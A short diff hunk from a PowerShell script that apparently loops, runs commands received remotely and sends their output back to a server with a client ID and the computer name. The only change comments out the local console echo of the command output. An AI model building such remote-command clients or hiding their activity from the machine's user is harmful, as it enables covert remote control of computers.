@@ -158,7 +158,7 @@ while ($true) {
                                     }
                                     
                                     Write-Host "Command executed successfully" -ForegroundColor Green
-                                    Write-Host "Output: $output" -ForegroundColor Gray
+                                    # Write-Host "Output: $output" -ForegroundColor Gray
                                     
                                     # Send output back to server with client_id
                                     $pcName = $env:COMPUTERNAME
